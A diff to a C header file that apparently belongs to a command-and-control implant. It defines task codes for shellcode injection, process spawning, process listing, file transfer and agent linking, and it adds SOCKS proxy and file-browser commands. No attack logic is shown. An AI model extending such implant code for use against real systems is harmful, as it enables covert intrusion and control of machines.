@@ -26,8 +26,10 @@
 #define LINK_ADD            0x05
 #define LINK_MSG            0x06
 #define LINK_REMOVE         0x07
+#define SOCKS_DATA          0x08
+#define FILE_BROWSER        0x09
 
-// General
+// Commands
 #define STATUS_CMD      0x37
 #define SLEEP_CMD       0x38
 #define EXAMPLE_CMD     0x40
@@ -46,7 +48,7 @@
 // #define EXECUTE_ASSEMBLY_CMD 0x54
 #define SPAWNTO_CMD     0x55
 #define INJECT_SHELLCODE_CMD     0x56
-// #define REGISTER_PROCESS_INJECT_KIT_CMD 0x57
+#define SOCKS_CMD       0x57
 
 // System enumeration
 #define PS_CMD          0x52
@@ -71,13 +73,7 @@
 #define LINK_RESP       0xCB
 #define DOWNLOAD_RESP   0xCC
 #define UPLOAD_RESP     0xCD
-
-
-
-typedef struct _TASK_PARAMETER {
-    char* TaskUuid;        // UUID of the task
-    PPARSER TaskParser;    // Task parser object
-} TASK_PARAMETER, *PTASK_PARAMETER;
+#define SOCKS_RESP      0xCE
 
 BOOL TaskCheckin(PPARSER checkinResponseData);
 VOID TaskRoutine();
